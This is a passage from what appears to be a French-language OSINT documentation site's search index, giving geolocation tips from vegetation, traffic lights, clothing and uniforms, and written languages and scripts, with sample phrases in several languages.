construction des murs d'enceinte ou des cl\u00f4tures.</li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Conseils%20g%C3%A9n%C3%A9raux/#3-vegetation-et-paysage","title":"3. V\u00e9g\u00e9tation et Paysage","text":"<ul> <li> <p>Types d'Arbres et de Plantes :</p> <ul> <li> <p>Palmiers, pins, bouleaux, eucalyptus, baobabs, etc., indiquent clairement un climat et une r\u00e9gion.</p> </li> <li> <p>Types de cultures agricoles visibles (riz, bl\u00e9, ma\u00efs, vignes, oliviers...).</p> </li> </ul> </li> <li> <p>Couleur du Sol :</p> <ul> <li>Terre rouge (lat\u00e9rite), sol sablonneux, terre noire...</li> </ul> </li> <li> <p>Topographie :</p> <ul> <li>Plat, vallonn\u00e9, montagneux, c\u00f4tier.</li> </ul> </li> <li> <p>Climat Visible :</p> <ul> <li>Neige, aridit\u00e9, v\u00e9g\u00e9tation luxuriante tropicale.</li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Conseils%20g%C3%A9n%C3%A9raux/#4-langue-et-ecriture","title":"4. Langue et \u00c9criture","text":"<ul> <li> <p>Langue Principale : Visible sur les enseignes de magasins, publicit\u00e9s, panneaux officiels.</p> </li> <li> <p>Alphabet/Syst\u00e8me d'\u00c9criture : Latin, cyrillique, arabe, id\u00e9ogrammes (chinois, japonais, cor\u00e9en), etc.</p> </li> <li> <p>Diacritiques et Caract\u00e8res Sp\u00e9ciaux : Pr\u00e9sence de \u00f1, \u00e7, \u00fc, \u00f8, \u00e5, \u0142, caract\u00e8res sp\u00e9cifiques d'Europe de l'Est ou d'Asie du Sud-Est...</p> </li> <li> <p>Polices de Caract\u00e8res : Certaines polices sont embl\u00e9matiques (ex: la police des autoroutes am\u00e9ricaines \"Highway Gothic\" ou son rempla\u00e7ant \"Clearview\").</p> </li> </ul>"},{"location":"Osint/Lieux/Conseils%20g%C3%A9n%C3%A9raux/#5-vehicules-autres-que-plaquesmodeles","title":"5. V\u00e9hicules (Autres que Plaques/Mod\u00e8les)","text":"<ul> <li> <p>Sens de Circulation : Conduite \u00e0 gauche (UK, Irlande, Malte, Chypre, Japon, Inde, Australie, Afrique Australe...) ou \u00e0 droite (majorit\u00e9 du monde). Visible par la position du volant ou le flux du trafic.</p> </li> <li> <p>Types de V\u00e9hicules Courants : Pr\u00e9valence de scooters/motos (Asie du Sud-Est), tuk-tuks (Asie, Afrique), marques de camions sp\u00e9cifiques, types de bus.</p> </li> <li> <p>Couleur des Taxis : Souvent r\u00e9glement\u00e9e et sp\u00e9cifique \u00e0 une ville ou un pays (jaune \u00e0 New York, noir \u00e0 Londres, etc.).</p> </li> </ul>"},{"location":"Osint/Lieux/Conseils%20g%C3%A9n%C3%A9raux/#6-indices-culturels-et-humains","title":"6. Indices Culturels et Humains","text":"<ul> <li> <p>Enseignes Commerciales : Marques locales vs internationales, types de commerces (march\u00e9s sp\u00e9cifiques).</p> </li> <li> <p>Publicit\u00e9s : Langue, produits promus, style graphique.</p> </li> <li> <p>Personnes (avec prudence) : Styles vestimentaires traditionnels ou sp\u00e9cifiques (moins fiable avec la mondialisation).</p> </li> <li> <p>Symboles Religieux Visibles : \u00c9glises, mosqu\u00e9es, temples, synagogues, croix sur les montagnes...</p> </li> </ul>"},{"location":"Osint/Lieux/Feux%20de%20signalisation/","title":"Feux de signalisation","text":""},{"location":"Osint/Lieux/Feux%20de%20signalisation/#introduction","title":"Introduction","text":"<p>Les feux de signalisation tricolores (rouge, orange/ambr\u00e9, vert) sont une composante standard de la r\u00e9gulation du trafic dans le monde entier. Cependant, au-del\u00e0 de cette base commune, une multitude de variations dans leur design, leur disposition, leur montage et les signaux associ\u00e9s existent. Ces d\u00e9tails, souvent subtils, sont des indices pr\u00e9cieux pour la g\u00e9olocalisation en OSINT et pour GeoGuessr.</p>"},{"location":"Osint/Lieux/Feux%20de%20signalisation/#1-elements-cles-a-analyser","title":"1. \u00c9l\u00e9ments Cl\u00e9s \u00e0 Analyser","text":"<ul> <li> <p>Orientation : Verticale ou horizontale ?</p> </li> <li> <p>Bo\u00eetier (T\u00eate / Corps) : Mat\u00e9riau, couleur, forme, pr\u00e9sence et forme des visi\u00e8res (casquettes).</p> </li> <li> <p>Lentilles / Lumi\u00e8res : Taille, type (incandescent vs LED), forme des LED, s\u00e9quence des couleurs.</p> </li> <li> <p>Poteaux et Montage : Type de poteau (mat\u00e9riau, couleur, forme), type de fixation (poteau d\u00e9di\u00e9, poteau d'\u00e9clairage, potence/m\u00e2t, c\u00e2bles a\u00e9riens).</p> </li> <li> <p>Placement : Avant l'intersection (c\u00f4t\u00e9 proche), apr\u00e8s l'intersection (c\u00f4t\u00e9 \u00e9loign\u00e9), au centre suspendu ?</p> </li> <li> <p>Signaux Additionnels : Fl\u00e8ches directionnelles, feux pi\u00e9tons, feux cyclistes, feux tram/bus.</p> </li> <li> <p>Fonctionnalit\u00e9s Sp\u00e9cifiques : Compte \u00e0 rebours, cam\u00e9ras, plaques r\u00e9fl\u00e9chissantes, signaux de pr\u00e9emption.</p> </li> </ul>"},{"location":"Osint/Lieux/Feux%20de%20signalisation/#2-orientation-des-feux","title":"2. Orientation des Feux","text":"<ul> <li> <p>Verticale :</p> <ul> <li> <p>Usage : Le plus courant mondialement.</p> </li> <li> <p>Ordre standard : Rouge en haut, Orange/Ambr\u00e9 au milieu, Vert en bas.</p> </li> </ul> </li> <li> <p>Horizontale :</p> <ul> <li> <p>Usage : Courant dans certaines r\u00e9gions des USA (ex: Texas, Nouveau-Mexique), certaines provinces canadiennes, parfois au Japon ou dans des situations sp\u00e9cifiques (ponts bas, tunnels).</p> </li> <li> <p>Ordre standard (pour circulation \u00e0 droite) : Rouge \u00e0 gauche, Orange/Ambr\u00e9 au milieu, Vert \u00e0 droite.</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Feux%20de%20signalisation/#3-boitier-tete-corps-du-feu","title":"3. Bo\u00eetier (T\u00eate / Corps du Feu)","text":"<ul> <li> <p>Mat\u00e9riau : M\u00e9tal peint (plus ancien), polycarbonate ou plastique (moderne).</p> </li> <li> <p>Couleur : Noir (tr\u00e8s fr\u00e9quent), Jaune (typique aux USA), Vert fonc\u00e9, Gris.</p> </li> <li> <p>Forme : G\u00e9n\u00e9ralement rectangulaire avec des coins plus ou moins arrondis.</p> </li> <li> <p>Visi\u00e8res (Casquettes) : Pr\u00e9sentes au-dessus de chaque feu pour am\u00e9liorer la visibilit\u00e9 au soleil. Leur forme (tunnel, coup\u00e9e, type casquette) et leur longueur varient. Certaines conceptions modernes en ont de tr\u00e8s petites voire pas du tout.</p> </li> <li> <p>Dos du Bo\u00eetier : Peut \u00eatre lisse, nervur\u00e9, ou avoir un motif sp\u00e9cifique. Pr\u00e9sence d'\u00e9tiquettes (fabricant, date, ville) ?</p> </li> </ul>"},{"location":"Osint/Lieux/Feux%20de%20signalisation/#4-lumieres-et-lentilles","title":"4. Lumi\u00e8res et Lentilles","text":"<ul> <li> <p>Taille : Standard 200 mm (8 pouces) ou 300 mm (12 pouces). Les plus grandes sont souvent pour les voies rapides ou pour am\u00e9liorer la visibilit\u00e9.</p> </li> <li> <p>Type :</p> <ul> <li> <p>Incandescent : Ampoule classique (de plus en plus rare).</p> </li> <li> <p>LED : R\u00e9seau de diodes \u00e9lectroluminescentes. Plus lumineux, consomme moins. Le motif des LED peut varier (points formant un cercle, matrice dense...).</p> </li> </ul> </li> <li> <p>S\u00e9quence des Couleurs :</p> <ul> <li> <p>Standard : Vert -&gt; Orange -&gt; Rouge -&gt; Vert...</p> </li> <li> <p>Variante UK/Irlande/Afrique du Sud... : Rouge -&gt; Rouge + Orange simultan\u00e9ment -&gt; Vert -&gt; Orange -&gt; Rouge...</p> </li> <li> <p>Orange Clignotant : Peut indiquer un mode nuit/faible trafic, ou un avertissement sp\u00e9cifique.</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Feux%20de%20signalisation/#5-poteaux-et-montage","title":"5. Poteaux et Montage","text":"<ul> <li> <p>Type de Poteau :</p> <ul> <li> <p>M\u00e9tal : Galvanis\u00e9 (gris argent\u00e9), peint (noir, vert, gris...). Forme ronde, carr\u00e9e, octogonale.</p> </li> <li> <p>B\u00e9ton : Moins courant pour les feux seuls.</p> </li> <li> <p>Bois : Tr\u00e8s rare, parfois dans des zones rurales anciennes.</p> </li> </ul> </li> <li> <p>Type de Montage :</p> <ul> <li> <p>Sur Poteau Vertical D\u00e9di\u00e9 : Le plus simple.</p> </li> <li> <p>Sur Poteau d'\u00c9clairage Existant.</p> </li> <li> <p>En Potence / M\u00e2t (Mast Arm) : Un bras horizontal s'\u00e9tend au-dessus de la chauss\u00e9e depuis un poteau sur le c\u00f4t\u00e9. Tr\u00e8s courant.</p> </li> <li> <p>Suspendu par C\u00e2bles A\u00e9riens (Span Wire) : Les feux sont suspendus \u00e0 des c\u00e2bles tendus entre des poteaux de part et d'autre de l'intersection. Tr\u00e8s courant aux USA et Canada.</p> </li> <li> <p>Montage sur Portique (Gantry) : Structure traversant toute la chauss\u00e9e.</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Feux%20de%20signalisation/#6-signaux-additionnels","title":"6. Signaux Additionnels","text":"<ul> <li> <p>Fl\u00e8ches Directionnelles :</p> <ul> <li> <p>Vertes : Pour les virages prot\u00e9g\u00e9s (prioritaires). La forme de la fl\u00e8che varie. Peuvent \u00eatre int\u00e9gr\u00e9es au feu principal ou dans un bo\u00eetier s\u00e9par\u00e9.</p> </li> <li> <p>Orange / Rouges : Indiquent la fin de la phase prot\u00e9g\u00e9e ou l'interdiction de tourner.</p> </li> </ul> </li> <li> <p>Feux Pi\u00e9tons :</p> <ul> <li> <p>Pictogrammes : Silhouette \"Homme Rouge\" / \"Homme Vert\" (style Convention de Vienne, mais variations nationales dans le dessin).</p> </li> <li> <p>Texte : \"WALK\" / \"DON'T WALK\" ou symboles de main (typique USA/Canada).</p> </li> <li> <p>Compte \u00e0 Rebours Num\u00e9rique : De plus en plus courant.</p> </li> <li> <p>Bo\u00eetier : Forme et couleur sp\u00e9cifiques, souvent plus petits.</p> </li> <li> <p>Bouton d'Appel Pi\u00e9ton : Le design du bouton et du bo\u00eetier associ\u00e9 varie \u00e9norm\u00e9ment. Pr\u00e9sence d'indications en braille ou de signaux sonores ?</p> </li> </ul> </li> <li> <p>Feux Cyclistes :</p> <ul> <li>Bo\u00eetiers plus petits avec pictogramme de v\u00e9lo. De plus en plus courants en Europe et ailleurs.</li> </ul> </li> <li> <p>Feux Tram / Bus :</p> <ul> <li>Signaux sp\u00e9cifiques, souvent avec des barres ou points blancs (Europe) ou des lettres (ex: \"T\" pour tram).</li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Feux%20de%20signalisation/#7-fonctionnalites-specifiques","title":"7. Fonctionnalit\u00e9s Sp\u00e9cifiques","text":"<ul> <li> <p>Plaques Arri\u00e8re R\u00e9flechissantes (Backplates) :</p> <ul> <li>Plaques (souvent noires) entourant les feux pour am\u00e9liorer le contraste. Souvent bord\u00e9es d'une bande r\u00e9fl\u00e9chissante (jaune ou blanche). Tr\u00e8s courantes en Am\u00e9rique du Nord.</li> </ul> </li> <li> <p>Cam\u00e9ras :</p> <ul> <li>Cam\u00e9ras de surveillance du trafic ou cam\u00e9ras \"feu rouge\" (pour verbaliser). Leur forme et leur positionnement varient.</li> </ul> </li> <li> <p>Signaux de Pr\u00e9emption pour V\u00e9hicules d'Urgence :</p> <ul> <li>Petites lumi\u00e8res additionnelles (souvent stroboscopiques) qui s'activent \u00e0 l'approche d'un v\u00e9hicule prioritaire (surtout Am\u00e9rique du Nord).</li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Feux%20de%20signalisation/#8-exemples-de-variations-regionales-notables","title":"8. Exemples de Variations R\u00e9gionales Notables","text":"<ul> <li> <p>USA / Canada : Grande diversit\u00e9. Feux horizontaux fr\u00e9quents par endroits. Bo\u00eetiers souvent jaunes. Montage sur c\u00e2bles (span wire) et potences tr\u00e8s r\u00e9pandu. Backplates r\u00e9fl\u00e9chissantes communes. Feux pi\u00e9tons texte/main.</p> </li> <li> <p>Europe (Convention de Vienne) : Majoritairement verticaux, bo\u00eetiers noirs/gris. Montage sur poteaux ou potences. Pictogrammes pi\u00e9tons/cyclistes standardis\u00e9s (avec l\u00e9g\u00e8res variations). S\u00e9quence Rouge+Orange possible (ex: UK).</p> </li> <li> <p>Japon : Visi\u00e8res souvent tr\u00e8s prononc\u00e9es. Feux horizontaux possibles. Feux pi\u00e9tons parfois anim\u00e9s ou avec sons distinctifs. Cadre noir autour des lentilles parfois visible.</p> </li> <li> <p>Australie / Nouvelle-Z\u00e9lande : Combinaison d'influences UK et US. S\u00e9quences et types de passages pi\u00e9tons sp\u00e9cifiques.</p> </li> </ul>"},{"location":"Osint/Lieux/Feux%20de%20signalisation/#9-application-osint","title":"9. Application OSINT","text":"<ul> <li> <p>Combinaison d'Indices : L'orientation (verticale/horizontale), la couleur du bo\u00eetier (noir/jaune), le type de montage (poteau/c\u00e2ble/potence) et la pr\u00e9sence de backplates sont des filtres puissants.</p> </li> <li> <p>Feux Pi\u00e9tons : Le style (pictogramme vs texte) est un excellent indicateur.</p> </li> <li> <p>Coh\u00e9rence : V\u00e9rifier la coh\u00e9rence avec les autres indices (marquage, panneaux, architecture...). Un feu jaune sur c\u00e2ble pointe fortement vers l'Am\u00e9rique du Nord.</p> </li> <li> <p>Recherche Cibl\u00e9e : Utiliser des termes comme \"traffic light [country/city name]\", \"pedestrian signal [country]\" pour trouver des images comparatives ou des sp\u00e9cifications locales.</p> </li> </ul>"},{"location":"Osint/Lieux/Indices%20vestimentaires/","title":"Indices vestimentaires","text":""},{"location":"Osint/Lieux/Indices%20vestimentaires/#introduction","title":"Introduction","text":"<p>Analyser les v\u00eatements port\u00e9s par les personnes dans une image peut fournir des indices sur la localisation, le climat, la culture, voire le contexte socio-\u00e9conomique. Cependant, c'est un domaine complexe : la mode occidentale moderne (jeans, t-shirts, baskets...) est devenue quasi universelle, en particulier dans les zones urbaines. Il faut donc se concentrer sur les \u00e9l\u00e9ments les plus distinctifs : tenues traditionnelles, uniformes, v\u00eatements de travail sp\u00e9cifiques, accessoires et adaptation \u00e9vidente au climat, tout en \u00e9tant conscient des limites de cette approche.</p>"},{"location":"Osint/Lieux/Indices%20vestimentaires/#1-elements-cles-a-analyser","title":"1. \u00c9l\u00e9ments Cl\u00e9s \u00e0 Analyser","text":"<ul> <li> <p>Type de V\u00eatements : Tenue traditionnelle/folklorique vs moderne/occidentalis\u00e9e ? Formel vs informel ?</p> </li> <li> <p>Uniformes : Police, arm\u00e9e, \u00e9cole, services publics, entreprises ?</p> </li> <li> <p>V\u00eatements de Travail : Sp\u00e9cifiques \u00e0 une profession (construction, agriculture...) ?</p> </li> <li> <p>Tenues Religieuses : Couvre-chefs, robes, symboles ?</p> </li> <li> <p>Accessoires : Chapeaux, foulards, chaussures, sacs ?</p> </li> <li> <p>Logos / Marques / Inscriptions : Marques locales, \u00e9quipes sportives, noms d'universit\u00e9s ?</p> </li> <li> <p>Adaptation au Climat : V\u00eatements chauds vs l\u00e9gers ? Protection solaire ou contre la pluie ?</p> </li> </ul>"},{"location":"Osint/Lieux/Indices%20vestimentaires/#2-tenues-traditionnelles-folkloriques","title":"2. Tenues Traditionnelles / Folkloriques","text":"<ul> <li> <p>Fiabilit\u00e9 : Tr\u00e8s bon indicateur g\u00e9ographique et culturel, MAIS souvent r\u00e9serv\u00e9 aux occasions sp\u00e9ciales (festivals, c\u00e9r\u00e9monies), aux zones rurales recul\u00e9es, ou port\u00e9 pour les touristes. Moins courant au quotidien dans la plupart des r\u00e9gions.</p> </li> <li> <p>Exemples :</p> <ul> <li> <p>Kilt : \u00c9cosse. </p> </li> <li> <p>Sari / Dhoti / Kurta : Sous-continent Indien (Inde, Pakistan, Bangladesh, N\u00e9pal, Sri Lanka). Le style de drap\u00e9 du sari peut varier r\u00e9gionalement. </p> </li> <li> <p>Kimono / Yukata : Japon (surtout pour occasions sp\u00e9ciales). </p> </li> <li> <p>Lederhosen / Dirndl : Bavi\u00e8re (Allemagne), Autriche (souvent folklorique). </p> </li> <li> <p>Djellaba / Caftan : Afrique du Nord. </p> </li> <li> <p>Poncho / Chapeau Melon (Cholitas) : R\u00e9gions andines (Bolivie, P\u00e9rou...).</p> </li> <li> <p>Dashiki : Afrique de l'Ouest. </p> </li> <li> <p>Ao Dai : Vietnam (surtout femmes, occasions sp\u00e9ciales). </p> </li> </ul> </li> <li> <p>Reconnaissance : N\u00e9cessite une connaissance culturelle sp\u00e9cifique ou une recherche d'images cibl\u00e9e (\"tenue traditionnelle [pays/r\u00e9gion]\").</p> </li> </ul>"},{"location":"Osint/Lieux/Indices%20vestimentaires/#3-uniformes","title":"3. Uniformes","text":"<ul> <li> <p>Fiabilit\u00e9 : Souvent l'indice vestimentaire le plus fiable car standardis\u00e9 et sp\u00e9cifique \u00e0 un pays ou une organisation.</p> </li> <li> <p>Types :</p> <ul> <li> <p>Police / Gendarmerie / Arm\u00e9e : La couleur (bleu marine, noir, vert, kaki, camouflage...), la coupe, les insignes (\u00e9cussons, grades), la forme des casquettes/k\u00e9pis/b\u00e9rets sont tr\u00e8s distinctifs.</p> </li> <li> <p>Services Postaux : Couleurs et logos sp\u00e9cifiques par pays.</p> </li> <li> <p>Personnel des Transports : Conducteurs de train/bus, personnel de gare/a\u00e9roport.</p> </li> <li> <p>Livreurs : Uniformes de soci\u00e9t\u00e9s de livraison (DHL, UPS, entreprises locales...).</p> </li> <li> <p>\u00c9coliers : Tr\u00e8s courants dans certains pays (UK, Irlande, Japon, Cor\u00e9e, Australie, Nouvelle-Z\u00e9lande, nombreux pays d'Afrique, d'Asie, d'Am\u00e9rique Latine). Le style (couleur, blazer, jupe/pantalon, cravate...) peut \u00eatre sp\u00e9cifique \u00e0 un pays ou m\u00eame une \u00e9cole. </p> </li> <li> <p>Personnel M\u00e9dical : Blouses, couleurs sp\u00e9cifiques (scrubs).</p> </li> <li> <p>Personnel de Service : Compagnies a\u00e9riennes, h\u00f4tels, cha\u00eenes de restauration rapide...</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Indices%20vestimentaires/#4-vetements-de-travail-non-uniforme","title":"4. V\u00eatements de Travail (Non-Uniforme)","text":"<ul> <li> <p>Fiabilit\u00e9 : Moyenne, d\u00e9pend de la sp\u00e9cificit\u00e9 de la t\u00e2che et des traditions locales.</p> </li> <li> <p>Exemples :</p> <ul> <li> <p>Ouvriers du BTP : Gilets haute visibilit\u00e9 (couleur - jaune, orange - et normes peuvent varier), casques (couleur peut indiquer le r\u00f4le sur certains chantiers), chaussures de s\u00e9curit\u00e9, salopettes/bleus de travail.</p> </li> <li> <p>Agriculteurs / P\u00eacheurs : V\u00eatements pratiques, souvent robustes. Chapeaux de paille sp\u00e9cifiques, bottes en caoutchouc, type de panier ou d'outil port\u00e9.</p> </li> <li> <p>Vendeurs de March\u00e9 : Tabliers, tenues simples.</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Indices%20vestimentaires/#5-tenues-religieuses","title":"5. Tenues Religieuses","text":"<ul> <li> <p>Fiabilit\u00e9 : Bonne, indique une appartenance religieuse et parfois une r\u00e9gion sp\u00e9cifique.</p> </li> <li> <p>Exemples :</p> <ul> <li> <p>Couvre-chefs f\u00e9minins musulmans : Hijab (foulard couvrant cheveux et cou), Niqab (voile couvrant le visage sauf les yeux), Burqa (voile int\u00e9gral). Styles et pr\u00e9valence varient selon les pays et r\u00e9gions.</p> </li> <li> <p>Couvre-chefs masculins : Turban (Sikhs, certains musulmans - styles varient), Kippa/Yarmulke (Juifs), Ch\u00e9chia/Fez (Afrique du Nord).</p> </li> <li> <p>Tenues monastiques : Robes de moines bouddhistes (couleur safran, marron, grise selon les \u00e9coles/r\u00e9gions), habits de nonnes/pr\u00eatres chr\u00e9tiens (styles varient selon les ordres).</p> </li> <li> <p>Symboles : Croix, \u00c9toile de David, Om, etc., port\u00e9s en bijoux ou sur les v\u00eatements.</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Indices%20vestimentaires/#6-indices-climatiques","title":"6. Indices Climatiques","text":"<ul> <li> <p>Fiabilit\u00e9 : Bonne, corrobore les indices de v\u00e9g\u00e9tation et de paysage.</p> </li> <li> <p>Temps Froid : Manteaux \u00e9pais, doudounes, bonnets, gants, \u00e9charpes, bottes fourr\u00e9es. Superposition de couches.</p> </li> <li> <p>Temps Chaud : Tissus l\u00e9gers (coton, lin), manches courtes, shorts, jupes, robes l\u00e9g\u00e8res, sandales, tongs. Chapeaux pour le soleil.</p> </li> <li> <p>Temps Pluvieux : Imperm\u00e9ables, K-ways, parapluies (la forme et la taille des parapluies peuvent parfois \u00eatre un indice mineur).</p> </li> </ul>"},{"location":"Osint/Lieux/Indices%20vestimentaires/#7-accessoires","title":"7. Accessoires","text":"<ul> <li> <p>Chapeaux : Casquettes de baseball (mondialis\u00e9es), chapeaux de paille (formes varient), b\u00e9rets (France, Pays Basque...), Ouchanka (Russie/Europe de l'Est), chapeaux traditionnels sp\u00e9cifiques.</p> </li> <li> <p>Chaussures : Sandales/Tongs (climats chauds), bottes (froid/pluie/travail), espadrilles (M\u00e9diterran\u00e9e), chaussures traditionnelles sp\u00e9cifiques.</p> </li> <li> <p>Foulards / \u00c9charpes : Motifs (ex: tartan \u00e9cossais), mani\u00e8re de nouer.</p> </li> <li> <p>Sacs : Sacs \u00e0 dos, sacs en bandouli\u00e8re, paniers traditionnels.</p> </li> </ul>"},{"location":"Osint/Lieux/Indices%20vestimentaires/#8-logos-marques-et-inscriptions","title":"8. Logos, Marques et Inscriptions","text":"<ul> <li> <p>Fiabilit\u00e9 : Variable. Marques internationales (Nike, Adidas...) peu utiles.</p> </li> <li> <p>Indices Utiles :</p> <ul> <li> <p>Logos d'\u00e9quipes sportives locales (football, baseball...).</p> </li> <li> <p>Noms ou logos d'universit\u00e9s, d'\u00e9coles.</p> </li> <li> <p>Marques de supermarch\u00e9s ou d'entreprises locales sur les sacs de courses ou v\u00eatements promotionnels.</p> </li> <li> <p>Messages/Slogans en langue locale.</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Indices%20vestimentaires/#9-limites-et-precautions","title":"9. Limites et Pr\u00e9cautions","text":"<ul> <li> <p>Globalisation : La mode occidentale est dominante, surtout chez les jeunes et en milieu urbain.</p> </li> <li> <p>Tourisme : Les touristes peuvent porter des v\u00eatements inadapt\u00e9s ou non repr\u00e9sentatifs du lieu.</p> </li> <li> <p>Contexte : Grande diff\u00e9rence entre ville/campagne, travail/loisir, jour/nuit, \u00e9v\u00e9nement sp\u00e9cial/quotidien.</p> </li> <li> <p>St\u00e9r\u00e9otypes : Se m\u00e9fier des clich\u00e9s et des repr\u00e9sentations simplistes. V\u00e9rifier les informations.</p> </li> <li> <p>Rapidit\u00e9 des Tendances : La mode change vite.</p> </li> </ul>"},{"location":"Osint/Lieux/Indices%20vestimentaires/#10-application-osint","title":"10. Application OSINT","text":"<ul> <li> <p>Prioriser les Uniformes : C'est souvent l'indice vestimentaire le plus s\u00fbr pour identifier un pays ou une organisation.</p> </li> <li> <p>Utiliser les Tenues Traditionnelles avec Contexte : Indique une culture, mais attention \u00e0 la situation (festival, zone touristique...).</p> </li> <li> <p>Corroborer le Climat : Les v\u00eatements confirment (ou infirment) les indices climatiques issus de la v\u00e9g\u00e9tation ou de la m\u00e9t\u00e9o visible.</p> </li> <li> <p>Rechercher les Logos/Inscriptions Locaux : Peut n\u00e9cessiter une recherche d'image ou une connaissance locale.</p> </li> </ul>"},{"location":"Osint/Lieux/Langues/","title":"Langues","text":""},{"location":"Osint/Lieux/Langues/#introduction","title":"Introduction","text":"<p>La langue visible sur les panneaux, les enseignes, les publicit\u00e9s ou les graffitis est l'un des indices de g\u00e9olocalisation les plus directs et les plus puissants. Reconna\u00eetre l'alphabet utilis\u00e9, les caract\u00e8res sp\u00e9ciaux (diacritiques), certains mots courants ou m\u00eame la structure g\u00e9n\u00e9rale d'une phrase peut consid\u00e9rablement affiner une recherche. Cette note vise \u00e0 fournir des cl\u00e9s de reconnaissance pour diverses langues et syst\u00e8mes d'\u00e9criture.</p>"},{"location":"Osint/Lieux/Langues/#1-elements-cles-a-analyser","title":"1. \u00c9l\u00e9ments Cl\u00e9s \u00e0 Analyser","text":"<ul> <li> <p>Syst\u00e8me d'\u00c9criture / Alphabet : Latin, cyrillique, arabe, id\u00e9ogrammes, etc. ?</p> </li> <li> <p>Caract\u00e8res Sp\u00e9ciaux / Diacritiques : Accents (\u00e9, \u00e8, \u00ea), c\u00e9dille (\u00e7), tilde (\u00f1), umlaut (\u00fc, \u00f6), caract\u00e8res barr\u00e9s (\u0142, \u00f8), carons (\u010d, \u0161, \u017e), etc.</p> </li> <li> <p>Mots Courants : Rechercher des mots comme \"STOP\", \"Rue\"/\"Street\"/\"Strasse\", \"Sortie\"/\"Exit\"/\"Ausfahrt\", \"Police\"/\"Polizei\"/\"Polic\u00eda\", noms de marques locales.</p> </li> <li> <p>Structure des Mots : Longueur des mots, pr\u00e9sence de nombreux accents ou de doubles lettres, terminaisons fr\u00e9quentes.</p> </li> <li> <p>Direction de l'\u00c9criture : Gauche \u00e0 droite (majorit\u00e9), droite \u00e0 gauche (arabe, h\u00e9breu), verticale (traditionnel est-asiatique).</p> </li> </ul>"},{"location":"Osint/Lieux/Langues/#2-apercu-des-principaux-systemes-decriture-et-exemples","title":"2. Aper\u00e7u des Principaux Syst\u00e8mes d'\u00c9criture et Exemples","text":"<p>Voici quelques exemples de phrases simples dans diff\u00e9rentes langues pour donner une id\u00e9e de leur apparence et de leur structure.</p>"},{"location":"Osint/Lieux/Langues/#a-alphabet-latin","title":"A. Alphabet Latin","text":"<p>Tr\u00e8s r\u00e9pandu, mais avec de nombreuses variations nationales via les diacritiques et lettres additionnelles.</p> <ul> <li> <p>Langues Romanes :</p> <ul> <li> <p>Fran\u00e7ais : O\u00f9 se trouve la gare ? (Pr\u00e9sence d'accents, \u00e7)</p> </li> <li> <p>Espagnol : \u00bfD\u00f3nde est\u00e1 la estaci\u00f3n? (Points d'interrogation/exclamation invers\u00e9s \u00bf \u00a1, pr\u00e9sence de \u00f1, accents aigus \u00e1 \u00e9 \u00ed \u00f3 \u00fa)</p> </li> <li> <p>Portugais : Onde fica a esta\u00e7\u00e3o? (Pr\u00e9sence de \u00e7, \u00e3, \u00f5, accents vari\u00e9s \u00e2 \u00ea \u00f4 \u00e1 \u00e9 \u00ed \u00f3 \u00fa)</p> </li> <li> <p>Italien : Dov'\u00e8 la stazione? (Usage fr\u00e9quent d'accents graves sur la voyelle finale \u00e0 \u00e8 \u00ec \u00f2 \u00f9)</p> </li> <li> <p>Roumain : Unde este gara? (Pr\u00e9sence de \u0103, \u00e2, \u00ee, \u0219, \u021b)</p> </li> </ul> </li> <li> <p>Langues Germaniques :</p> <ul> <li> <p>Anglais : Where is the station? (Peu de diacritiques, structure SVO)</p> </li> <li> <p>Allemand : Wo ist der Bahnhof? (Noms communs en majuscule, pr\u00e9sence de \u00e4, \u00f6, \u00fc, \u00df)</p> </li> <li> <p>N\u00e9erlandais : Waar is het station? (Usage de \"ij\", doubles voyelles aa ee oo uu)</p> </li> <li> <p>Su\u00e9dois : Var \u00e4r stationen? (Pr\u00e9sence de \u00e5, \u00e4, \u00f6)</p> </li> <li> <p>Norv\u00e9gien : Hvor er stasjonen? (Pr\u00e9sence de \u00f8, \u00e6, \u00e5)</p> </li> <li> <p>Danois : Hvor er stationen? (Pr\u00e9sence de \u00f8, \u00e6, \u00e5 - similaire au norv\u00e9gien)</p> </li> </ul> </li> <li> <p>Langues Slaves (Alphabet Latin) :</p> <ul> <li> <p>Polonais : Gdzie jest stacja? (Diacritiques sp\u00e9cifiques : \u0105, \u0119, \u0107, \u0142, \u0144, \u00f3, \u015b, \u017a, \u017c. Beaucoup de \"sz\", \"cz\", \"rz\")</p> </li> <li> <p>Tch\u00e8que : Kde je n\u00e1dra\u017e\u00ed? (Diacritiques : \u00e1, \u00e9, \u00ed, \u00f3, \u00fa, \u016f, \u00fd, \u010d, \u010f, \u011b, \u0148, \u0159, \u0161, \u0165, \u017e. Le \"\u0159\" est unique)</p> </li> <li> <p>Slovaque : Kde je stanica? (Diacritiques : \u00e1, \u00e4, \u00e9, \u00ed, \u00f3, \u00f4, \u00fa, \u00fd, \u010d, \u010f, \u013e, \u013a, \u0148, \u0155, \u0161, \u0165, \u017e)</p> </li> <li> <p>Croate / Bosnien / Serbe (latin) : Gdje je stanica? / Gde je stanica? (Diacritiques : \u010d, \u0107, \u0111, \u0161, \u017e)</p> </li> <li> <p>Slov\u00e8ne : Kje je postaja? (Diacritiques : \u010d, \u0161, \u017e)</p> </li> </ul> </li> <li> <p>Autres Langues (Alphabet Latin) :</p> <ul> <li> <p>Finnois : Miss\u00e4 on asema? (Doubles voyelles/consonnes fr\u00e9quentes, pr\u00e9sence de \u00e4, \u00f6)</p> </li> <li> <p>Hongrois : Hol van az \u00e1llom\u00e1s? (Accents aigus sur voyelles \u00e1 \u00e9\u00ed \u00f3 \u00fa, doubles accents \u0151 \u0171)</p> </li> <li> <p>Turc : \u0130stasyon nerede? (Pr\u00e9sence de \u0131, \u00f6, \u00fc, \u00e7, \u011f, \u015f)</p> </li> <li> <p>Vietnamien : Ga xe l\u1eeda \u1edf \u0111\u00e2u? (Nombreux diacritiques indiquant les tons : \u00e0 \u00e1 \u1ea3 \u00e3 \u1ea1, etc.)</p> </li> </ul> </li> </ul>"},{"location":"Osint/Lieux/Langues/#b-alphabet-cyrillique","title":"B. Alphabet Cyrillique","text":"<p>Utilis\u00e9 principalement en 